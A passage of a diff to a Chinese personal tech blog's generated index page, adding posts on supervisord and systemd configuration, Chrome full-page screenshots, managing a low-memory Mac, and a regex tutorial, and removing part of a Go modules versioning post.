class="line">;stdout_logfile_maxbytes=1MB   ; 日志文件最大大小，和[supervisord]中定义的一样。默认为50</span><br><span class="line">;stdout_logfile_backups=10     ; 和[supervisord]定义的一样。默认10</span><br><span class="line">;stdout_capture_maxbytes=1MB   ; 这个东西是设定capture管道的大小，当值不为0的时候，子进程可以从stdout</span><br><span class="line">                                 发送信息，而supervisor可以根据信息，发送相应的event。</span><br><span class="line">                                 默认为0，为0的时候表达关闭管道。。。非必须项</span><br><span class="line">;stdout_events_enabled=false   ; 当设置为ture的时候，当子进程由stdout向文件描述符中写日志的时候，将</span><br><span class="line">                                 触发supervisord发送PROCESS_LOG_STDOUT类型的event</span><br><span class="line">                                 默认为false。。。非必须设置</span><br><span class="line">;stderr_logfile=/a/path        ; 这个东西是设置stderr写的日志路径，当redirect_stderr=true。这个就不用</span><br><span class="line">                                 设置了，设置了也是白搭。因为它会被写入stdout_logfile的同一个文件中</span><br><span class="line">                                 默认为AUTO，也就是随便找个地存，supervisord重启被清空。。非必须设置</span><br><span class="line">;stderr_logfile_maxbytes=1MB   ; 这个出现好几次了，就不重复了</span><br><span class="line">;stderr_logfile_backups=10     ; 这个也是</span><br><span class="line">;stderr_capture_maxbytes=1MB   ; 这个一样，和stdout_capture一样。 默认为0，关闭状态</span><br><span class="line">;stderr_events_enabled=false   ; 这个也是一样，默认为false</span><br><span class="line">;environment=A=&quot;1&quot;,B=&quot;2&quot;       ; 这个是该子进程的环境变量，和别的子进程是不共享的</span><br><span class="line">;serverurl=AUTO                ;</span><br><span class="line"></span><br><span class="line">; The below sample eventlistener section shows all possible</span><br><span class="line">; eventlistener subsection values, create one or more &#x27;real&#x27;</span><br><span class="line">; eventlistener: sections to be able to handle event notifications</span><br><span class="line">; sent by supervisor.</span><br><span class="line"></span><br><span class="line">;[eventlistener:theeventlistenername] ;这个东西其实和program的地位是一样的，也是suopervisor启动的子进</span><br><span class="line">                                       程，不过它干的活是订阅supervisord发送的event。他的名字就叫</span><br><span class="line">                                       listener了。我们可以在listener里面做一系列处理，比如报警等等</span><br><span class="line">                                       楼主这两天干的活，就是弄的这玩意</span><br><span class="line">;command=/bin/eventlistener    ; 这个和上面的program一样，表示listener的可执行文件的路径</span><br><span class="line">;process_name=%(program_name)s ; 这个也一样，进程名，当下面的numprocs为多个的时候，才需要。否则默认就</span><br><span class="line">                                 OK了</span><br><span class="line">;numprocs=1                    ; 相同的listener启动的个数</span><br><span class="line">;events=EVENT                  ; event事件的类型，也就是说，只有写在这个地方的事件类型。才会被发送</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;buffer_size=10                ; 这个是event队列缓存大小，单位不太清楚，楼主猜测应该是个吧。当buffer</span><br><span class="line">                                 超过10的时候，最旧的event将会被清除，并把新的event放进去。</span><br><span class="line">                                 默认值为10。。非必须选项</span><br><span class="line">;directory=/tmp                ; 进程执行前，会切换到这个目录下执行</span><br><span class="line">                                 默认为不切换。。。非必须</span><br><span class="line">;umask=022                     ; 淹没，默认为none，不说了</span><br><span class="line">;priority=-1                   ; 启动优先级，默认-1，也不扯了</span><br><span class="line">;autostart=true                ; 是否随supervisord启动一起启动，默认true</span><br><span class="line">;autorestart=unexpected        ; 是否自动重启，和program一个样，分true,false,unexpected等，注意</span><br><span class="line">                                  unexpected和exitcodes的关系</span><br><span class="line">;startsecs=1                   ; 也是一样，进程启动后跑了几秒钟，才被认定为成功启动，默认1</span><br><span class="line">;startretries=3                ; 失败最大尝试次数，默认3</span><br><span class="line">;exitcodes=0,2                 ; 期望或者说预料中的进程退出码，</span><br><span class="line">;stopsignal=QUIT               ; 干掉进程的信号，默认为TERM，比如设置为QUIT，那么如果QUIT来干这个进程</span><br><span class="line">                                 那么会被认为是正常维护，退出码也被认为是expected中的</span><br><span class="line">;stopwaitsecs=10               ; max num secs to wait b4 SIGKILL (default 10)</span><br><span class="line">;stopasgroup=false             ; send stop signal to the UNIX process group (default false)</span><br><span class="line">;killasgroup=false             ; SIGKILL the UNIX process group (def false)</span><br><span class="line">;user=chrism                   ;设置普通用户，可以用来管理该listener进程。</span><br><span class="line">                                默认为空。。非必须设置</span><br><span class="line">;redirect_stderr=true          ; 为true的话，stderr的log会并入stdout的log里面</span><br><span class="line">                                默认为false。。。非必须设置</span><br><span class="line">;stdout_logfile=/a/path        ; 这个不说了，好几遍了</span><br><span class="line">;stdout_logfile_maxbytes=1MB   ; 这个也是</span><br><span class="line">;stdout_logfile_backups=10     ; 这个也是</span><br><span class="line">;stdout_events_enabled=false   ; 这个其实是错的，listener是不能发送event</span><br><span class="line">;stderr_logfile=/a/path        ; 这个也是</span><br><span class="line">;stderr_logfile_maxbytes=1MB   ; 这个也是</span><br><span class="line">;stderr_logfile_backups        ; 这个不说了</span><br><span class="line">;stderr_events_enabled=false   ; 这个也是错的，listener不能发送event</span><br><span class="line">;environment=A=&quot;1&quot;,B=&quot;2&quot;       ; 这个是该子进程的环境变量</span><br><span class="line">                                 默认为空。。。非必须设置</span><br><span class="line">;serverurl=AUTO                ; override serverurl computation (childutils)</span><br><span class="line"></span><br><span class="line">; The below sample group section shows all possible group values,</span><br><span class="line">; create one or more &#x27;real&#x27; group: sections to create &quot;heterogeneous&quot;</span><br><span class="line">; process groups.</span><br><span class="line"></span><br><span class="line">;[group:thegroupname]  ;这个东西就是给programs分组，划分到组里面的program。我们就不用一个一个去操作了</span><br><span class="line">                         我们可以对组名进行统一的操作。 注意：program被划分到组里面之后，就相当于原来</span><br><span class="line">                         的配置从supervisor的配置文件里消失了。。。supervisor只会对组进行管理，而不再</span><br><span class="line">                         会对组里面的单个program进行管理了</span><br><span class="line">;programs=progname1,progname2  ; 组成员，用逗号分开</span><br><span class="line">                                 这个是个必须的设置项</span><br><span class="line">;priority=999                  ; 优先级，相对于组和组之间说的</span><br><span class="line">                                 默认999。。非必须选项</span><br><span class="line"></span><br><span class="line">; The [include] section can just contain the &quot;files&quot; setting.  This</span><br><span class="line">; setting can list multiple files (separated by whitespace or</span><br><span class="line">; newlines).  It can also contain wildcards.  The filenames are</span><br><span class="line">; interpreted as relative to this file.  Included files *cannot*</span><br><span class="line">; include files themselves.</span><br><span class="line"></span><br><span class="line">;[include]                         ;这个东西挺有用的，当我们要管理的进程很多的时候，写在一个文件里面</span><br><span class="line">                                    就有点大了。我们可以把配置信息写到多个文件中，然后include过来</span><br><span class="line">;files = relative/directory/*.ini</span><br></pre></td></tr></table></figure>
+
+<p>系统级守护</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Supervisor daemon</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/bin/start_supervisord.sh</span><br><span class="line">ExecStop=/usr/bin/supervisorctl $OPTIONS shutdown</span><br><span class="line">ExecReload=/usr/bin/supervisorctl $OPTIONS reload</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=on-failure //状态异常</span><br><span class="line">RestartSec=42s  // 检测时间</span><br><span class="line">SysVStartPriority=99</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/12/16/yuque/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-yuque/Chrome 浏览器截长图" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/23/yuque/Chrome%20%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E9%95%BF%E5%9B%BE/">Chrome 浏览器截长图</a>
+    </h1>
+  
+
+        
+        <a href="/2021/08/23/yuque/Chrome%20%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E9%95%BF%E5%9B%BE/" class="archive-article-date">
+  	<time datetime="2021-08-23T16:57:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-23</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>​</p>
+<h1 id="演示文稿"><a href="#演示文稿" class="headerlink" title="演示文稿"></a>演示文稿<img src="https://cdn.nlark.com/yuque/0/2021/gif/190217/1629738171910-3352b522-1dcb-4767-ab66-f80f88c82c7a.gif#clientId=ub70ba39b-ad9d-4&from=drop&id=u05ac54b5&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E9%95%BF%E5%9B%BE.gif&originHeight=1202&originWidth=1608&originalType=binary%E2%88%B6=1&size=3734464&status=done&style=none&taskId=u392e434a-371f-4488-810c-48dc8536ccf" alt="截长图.gif"></h1><h1 id="步骤分解"><a href="#步骤分解" class="headerlink" title="步骤分解"></a>步骤分解</h1><p>macOS</p>
+<h2 id="打开调试模式"><a href="#打开调试模式" class="headerlink" title="打开调试模式"></a>打开调试模式</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1629737977711-d8f46be5-2119-41d2-9b66-e39604d2b721.png#clientId=ub70ba39b-ad9d-4&from=paste&height=449&id=u2c9470dd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=449&originWidth=762&originalType=binary%E2%88%B6=1&size=221635&status=done&style=none&taskId=ub5e8241b-dbd3-4b46-9662-86f1d4fffa5&width=762" alt="image.png"></p>
+<h2 id="鼠标右键"><a href="#鼠标右键" class="headerlink" title="鼠标右键"></a>鼠标右键</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1629738002502-feaeb737-1cd5-4435-814b-06b5052ae854.png#clientId=ub70ba39b-ad9d-4&from=paste&height=377&id=u7c709de7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=377&originWidth=300&originalType=binary%E2%88%B6=1&size=84714&status=done&style=none&taskId=uf14a5292-3088-4ef7-8e4d-a30486426d0&width=300" alt="image.png"><br>​</p>
+<h2 id="输入-Command-shift-P"><a href="#输入-Command-shift-P" class="headerlink" title="输入 Command +shift + P"></a>输入 Command +shift + P</h2><p>​</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1629738073080-ef36d85b-c344-434f-93a3-04bfe1282b11.png#clientId=ub70ba39b-ad9d-4&from=paste&height=203&id=ud50444f3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=203&originWidth=611&originalType=binary%E2%88%B6=1&size=79360&status=done&style=none&taskId=u781f57e5-4934-4398-b31c-ae6b6cb8a90&width=611" alt="image.png"></p>
+<h2 id="然后输入-full-size-screenshot"><a href="#然后输入-full-size-screenshot" class="headerlink" title="然后输入 full size screenshot"></a>然后输入 full size screenshot</h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/23/yuque/Chrome%20%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E9%95%BF%E5%9B%BE/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-yuque/如何在有限的资源里使用电脑" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/19/yuque/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%9C%89%E9%99%90%E7%9A%84%E8%B5%84%E6%BA%90%E9%87%8C%E4%BD%BF%E7%94%A8%E7%94%B5%E8%84%91/">如何在有限的资源里使用电脑</a>
+    </h1>
+  
+
+        
+        <a href="/2021/08/19/yuque/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%9C%89%E9%99%90%E7%9A%84%E8%B5%84%E6%BA%90%E9%87%8C%E4%BD%BF%E7%94%A8%E7%94%B5%E8%84%91/" class="archive-article-date">
+  	<time datetime="2021-08-19T06:28:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="1-为何有这个问题？"><a href="#1-为何有这个问题？" class="headerlink" title="1.为何有这个问题？"></a>1.为何有这个问题？</h1><p>公司发的电脑是 M1 的 8G 研发同学用，可能是公司为了考验我，那我决定进行有限资源的应用使用。</p>
+<h1 id="2-我们如何做？"><a href="#2-我们如何做？" class="headerlink" title="2.我们如何做？"></a>2.我们如何做？</h1><h2 id="1-破釜沉舟-gt-安装：柠檬清理"><a href="#1-破釜沉舟-gt-安装：柠檬清理" class="headerlink" title="1.破釜沉舟 -&gt;安装：柠檬清理"></a>1.破釜沉舟 -&gt;安装：<a target="_blank" rel="noopener" href="https://pan.murphyyi.com/share/tools/Mac/intel/%E6%9F%A0%E6%AA%AC%E6%B8%85%E7%90%86">柠檬清理</a></h2><p><strong>他能帮我们做什么？</strong><br>将系统不用的内存进行回收，将系统不常用内存放到内存交换分区中。<br><img src="https://cdn.nlark.com/yuque/0/2021/gif/190217/1629358333404-f049b85e-b1e7-40af-8767-79a5696377c2.gif#clientId=ud1608a22-6cbb-4&from=drop&height=530&id=u053009f7&margin=%5Bobject%20Object%5D&name=%E6%9F%A0%E6%AA%AC.gif&originHeight=1152&originWidth=1488&originalType=binary%E2%88%B6=1&size=887410&status=done&style=none&taskId=u13f63ecb-ca07-4f0c-aa41-ab9fae9eb8f&width=684" alt="柠檬.gif"></p>
+<h2 id="2-精准定位-gt-活动监视器"><a href="#2-精准定位-gt-活动监视器" class="headerlink" title="2.精准定位 -&gt; 活动监视器"></a>2.精准定位 -&gt; 活动监视器</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1629359331616-fe174010-5f55-4f18-87e7-6b54de1d2a45.png#clientId=ud1608a22-6cbb-4&from=paste&height=676&id=AbViF&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1352&originWidth=1992&originalType=binary%E2%88%B6=1&size=372804&status=done&style=none&taskId=u1f992a2f-ad4e-441d-b56d-30d793cd8fa&width=996" alt="image.png"> 细心的你肯定会发现。我没有使用 chrome （我们为什么要用 chrome？chrome 为什么快？本质上它帮助我们自动缓内容到内存，对于小内存设备建议不使用该应用）</p>
+<h2 id="3-降本提效-gt-超级剪贴板"><a href="#3-降本提效-gt-超级剪贴板" class="headerlink" title="3.降本提效 -&gt; 超级剪贴板"></a>3.降本提效 -&gt; 超级剪贴板</h2><p>​</p>
+<p>办公利器 剪贴板的好助手 <a target="_blank" rel="noopener" href="https://pan.murphyyi.com/share/tools/Mac/intel/%E8%B6%85%E7%BA%A7%E5%89%AA%E8%B4%B4%E6%9D%BF">下载地址</a></p>
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1629359752546-79185de3-623e-47b4-b820-a1bff303551f.png#clientId=ud1608a22-6cbb-4&from=drop&id=ud84c9a8d&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-08-19%2015.55.33.png&originHeight=2100&originWidth=3354&originalType=binary%E2%88%B6=1&size=2585009&status=done&style=none&taskId=ucc23bca8-531b-4558-a715-23889344ebb" alt="截屏2021-08-19 15.55.33.png"></h2><p>4.效率提升-&gt;你的魔法<br><a target="_blank" rel="noopener" href="https://www.alfredapp.com/">https://www.alfredapp.com/</a></p>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p>5.常用工具-&gt; 关系你我</p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/murphyyi/blog/gl8sdq?view=doc_embed">macOS 新人必备</a></p>
+<p>历史文档：<br><a target="_blank" rel="noopener" href="https://www.yuque.com/docs/share/5b63b101-c821-48be-b35d-5a8d3bb338c7#">https://www.yuque.com/docs/share/5b63b101-c821-48be-b35d-5a8d3bb338c7?#</a> 《佛系提升 macOS Catalina &amp;&amp; iPad&amp;iphone 使用体验》</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/19/yuque/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%9C%89%E9%99%90%E7%9A%84%E8%B5%84%E6%BA%90%E9%87%8C%E4%BD%BF%E7%94%A8%E7%94%B5%E8%84%91/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-yuque/正则表达式（转载融合）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/29/yuque/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E8%BD%AC%E8%BD%BD%E8%9E%8D%E5%90%88%EF%BC%89/">正则表达式（转载融合）</a>
+    </h1>
+  
+
+        
+        <a href="/2021/07/29/yuque/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E8%BD%AC%E8%BD%BD%E8%9E%8D%E5%90%88%EF%BC%89/" class="archive-article-date">
+  	<time datetime="2021-07-29T15:32:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-29</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="正则是什么"><a href="#正则是什么" class="headerlink" title="正则是什么"></a>正则是什么</h1><p>在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要。<strong>正则表达式</strong>就是用于描述这些规则的工具。换句话说，正则表达式就是记录文本规则的代码。</p>
+<h1 id="最基础语法参考"><a href="#最基础语法参考" class="headerlink" title="最基础语法参考"></a>最基础语法参考</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">. - 除换行符以外的所有字符。</span><br><span class="line">^ - 字符串开头。</span><br><span class="line">$ - 字符串结尾。</span><br><span class="line">\d,\w,\s - 匹配数字、字符、空格。</span><br><span class="line">\D,\W,\S - 匹配非数字、非字符、非空格。</span><br><span class="line">[abc] - 匹配 a、b 或 c 中的一个字母。</span><br><span class="line">[a-z] - 匹配 a 到 z 中的一个字母。</span><br><span class="line">[^abc] - 匹配除了 a、b 或 c 中的其他字母。</span><br><span class="line">aa|bb - 匹配 aa 或 bb。</span><br><span class="line">? - 0 次或 1 次匹配。</span><br><span class="line">* - 匹配 0 次或多次。</span><br><span class="line">+ - 匹配 1 次或多次。</span><br><span class="line">&#123;n&#125; - 匹配 n次。</span><br><span class="line">&#123;n,&#125; - 匹配 n次以上。</span><br><span class="line">&#123;m,n&#125; - 最少 m 次，最多 n 次匹配。</span><br><span class="line">(expr) - 捕获 expr 子模式,以 \1 使用它。</span><br><span class="line">(?:expr) - 忽略捕获的子模式。</span><br><span class="line">(?&#x3D;expr) - 正向预查模式 expr。</span><br><span class="line">(?!expr) - 负向预查模式 expr。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>参考资料：<br>菜鸟教程 runoob 正则在线 <a target="_blank" rel="noopener" href="http://c.runoob.com/front-end/854">http://c.runoob.com/front-end/854</a>正则表达式一直是困扰很多程序员的一门技术，当然也包括曾经的我。大多数时候我们在开发过程中要用到某些正则表达式的时候，都会打开谷歌或百度直接搜索然后拷贝粘贴。当下一次再遇到相同问题的时候，同样的场景又再来一遍。作为一门用途很广的技术，我相信深入理解正则表达式并能融会贯通是值得的。所以，希望这篇文章能帮助大家理清思路，搞懂正则表达式各种符号之间的内在联系，形成知识体系，当下次再遇到正则表达式的时候可以不借助搜索引擎，自己解决。</p>
+<h1 id="正则表达式到底是什么"><a href="#正则表达式到底是什么" class="headerlink" title="正则表达式到底是什么"></a>正则表达式到底是什么</h1><p>正则表达式(Regular Expression)其实就是一门工具，<strong>目的</strong>是为了字符串模式匹配，从而实现搜索和替换功能。它起源于上个 20 世纪 50 年代科学家在数学领域做的一些研究工作，后来才被引入到计算机领域中。从它的命名我们可以知道，它是一种<strong>用来描述规则的表达式</strong>。而它的底层原理也十分简单，就是使用状态机的思想进行模式匹配。大家可以利用<a href="https://link.juejin.cn/?target=https://regexper.com/">regexper.com</a>这个工具很好地可视化自己写的正则表达式:<br>如<code>/\d\w+/</code>这个正则生成的状态机图:</p>
+<p><img src="https://user-gold-cdn.xitu.io/2019/5/16/16abe9d9357f691c?imageView2/0/w/1280/h/960/format/webp/ignore-error/1#id=qGCfj&originHeight=53&originWidth=154&originalType=binary%E2%88%B6=1&status=done&style=none"><br>对于具体的算法实现，大家如果感兴趣可以阅读《算法导论》。</p>
+<h1 id="从字符出发"><a href="#从字符出发" class="headerlink" title="从字符出发"></a>从字符出发</h1><p>我们学习一个系统化的知识，一定要从其基础构成来了解。正则表达式的基本<strong>组成元素</strong>可以分为：<strong>字符和元字符</strong>。字符很好理解，就是基础的计算机字符编码，通常正则表达式里面使用的就是数字、英文字母。而元字符，也被称为特殊字符，是一些用来表示特殊语义的字符。如^表示非,|表示或等。利用这些元字符，才能构造出强大的表达式模式(pattern)。接下来，我们就来从这些基本单位出发，来学习一下如何构建正则表达式。</p>
+<h2 id="单个字符"><a href="#单个字符" class="headerlink" title="单个字符"></a>单个字符</h2><p>最简单的正则表达式可以由简单的数字和字母组成，没有特殊的语义，纯粹就是一一对应的关系。如想在’apple’这个单词里找到‘a’这个字符，就直接用<code>/a/</code>这个正则就可以了。<br>但是如果想要匹配特殊字符的话，就得请出我们第一个元字符**<code>\</code>**， 它是转义字符字符，顾名思义，就是让其后续的字符失去其本来的含义。举个例子：<br>我想匹配<code>*</code>这个符号，由于<code>*</code>这个符号本身是个特殊字符，所以我要利用转义元字符<code>\</code>来让它失去其本来的含义：<br>复制代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;\*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>如果本来这个字符不是特殊字符，使用转义符号就会让它拥有特殊的含义。我们常常需要匹配一些特殊字符，比如空格，制表符，回车，换行等, 而这些就需要我们使用转义字符来匹配。为了便于记忆，我整理了下面这个表格，并附上记忆方式：</p>
 <table>
 <thead>
 <tr>
-<th>命令</th>
-<th>作用</th>
+<th>特殊字符</th>
+<th>正则表达式</th>
+<th>记忆方式</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>go get golang.org/x/text<a href="/latest">@latest </a></td>
-<td>拉取最新的版本，若存在  tag，则优先使用。</td>
+<td>换行符</td>
+<td>\n</td>
+<td><strong>n</strong>ew line</td>
 </tr>
 <tr>
-<td>go get golang.org/x/text<a href="/master">@master </a></td>
-<td>拉取  master  分支的最新  commit</td>
+<td>换页符</td>
+<td>\f</td>
+<td><strong>f</strong>orm feed</td>
 </tr>
 <tr>
-<td>go get golang.org/x/text<a href="/v0.3.2">@v0.3.2 </a></td>
-<td>拉取  tagv0.3.2  的 commit</td>
+<td>回车符</td>
+<td>\r</td>
+<td><strong>r</strong>eturn</td>
 </tr>
 <tr>
-<td>go get golang/x/text<a href="/342b2e">@342b2e </a></td>
-<td>拉取 hash342b2e  的 commit，最终会被转换为 v0.3.2</td>
+<td>空白符</td>
+<td>\s</td>
+<td><strong>s</strong>pace</td>
+</tr>
+<tr>
+<td>制表符</td>
+<td>\t</td>
+<td><strong>t</strong>ab</td>
+</tr>
+<tr>
+<td>垂直制表符</td>
+<td>\v</td>
+<td><strong>v</strong>ertical tab</td>
+</tr>
+<tr>
+<td>回退符</td>
+<td>[\b]</td>
+<td><strong>b</strong>ackspace,之所以使用[]符号是避免和\b 重复</td>
 </tr>
 </tbody></table>
-<p><a href="">
-</a><br><a href="">
-</a><br>go get 版本选择<br>我们回顾一下我们拉取的 go get github.com/eddycjy/mquote， 其结果是 <code>v0.0.0-20200220041913-e066a990ce6f</code> ，对照着上面所提到的 go get 行为来看，你可能还会有一些疑惑，<br><strong>那么就是在 go get 没有指定任何版本的情况下，它的版本选择规则是怎么样的</strong>，也就是为什么 go get 拉取的是  v0.0.0，它什么时候会拉取正常带版本号的 tags 呢。实际上这需要区分两种情况，如下</p>
-<ol>
-<li>所拉取的模块有发布 tags：<ol>
-<li>如果只有单个模块，那么就取主版本号最大的那个 tag</li>
-<li>如果有多个模块，则推算相应的模块路径，取主版本号最大的那个 tag（子模块的 tag 的模块路径会有前缀要求）</li>
-</ol>
-</li>
-<li>所拉取的模块没有发布过 tags<ol>
-<li>默认取主分支最新一次 commit 的 commithash</li>
-</ol>
-</li>
-</ol>
-<h4 id="没有发布过-tags"><a href="#没有发布过-tags" class="headerlink" title="没有发布过 tags"></a>没有发布过 tags</h4><p>那么为佬以拉取的是 v0.0.0，因为 github.com/eddycjy/mquote 没有发布任何的 tag，</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861317038-557c0ab0-ee10-4f8b-9b6c-ea060d40fb7a.png#align=left&display=inline&height=522&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.28.31.png&originHeight=522&originWidth=1454&size=123515&status=done&style=none&width=1454" alt="截屏2021-01-17 下午1.28.31.png"></p>
-<p>因此它默认取的是主分支最新一次 commit 的 commit_time 和 commit_hash，也就是 0200220041913-e066a990ce6f</p>
-<h4 id="有发布过-tags"><a href="#有发布过-tags" class="headerlink" title="有发布过 tags"></a>有发布过 tags</h4><p>在项目有发布 tags 的情况下，还存在着多种模式，也就是只有单个模块和多个模块，我们统一以多个模块来进行展示，因为多个模块的情况下就已经包含了单个模块的使用了，</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1610861506695-0692c455-2c28-48cb-a1be-93a8810555e4.png#align=left&display=inline&height=842&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-01-17%20%E4%B8%8B%E5%8D%881.31.39.png&originHeight=842&originWidth=1322&size=222789&status=done&style=none&width=1322" alt="截屏2021-01-17 下午1.31.39.png"></p>
-<p>在这个项目中，我们一共打了两个 tag，分别是 v0.0.1 和 module/tour/v0.0.1. 这时候你可能会奇怪，为什么要打 module/tour/v0.0.1 ，这么奇怪的 tag，这有什么意思吗？</p>
-<p>其实 go modules 在同一个项目下多个模块的 tag 表现方式，其主要目录结构为</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">├── go.mod</span><br><span class="line">├── module</span><br><span class="line">│   └── tour</span><br><span class="line">│       ├── go.mod</span><br><span class="line">│       └── tour.go</span><br><span class="line">└── quote.go</span><br></pre></td></tr></table></figure>
-
-<p><a href="">      </a><br><a href="">
-</a><br>可以看到 mquote 这个项目的根目录有一个 go.mod 文件，而在 module/tour 目录下也有一个 go.mod 文件，其模块导入和版本信息的对应关系如下</p>
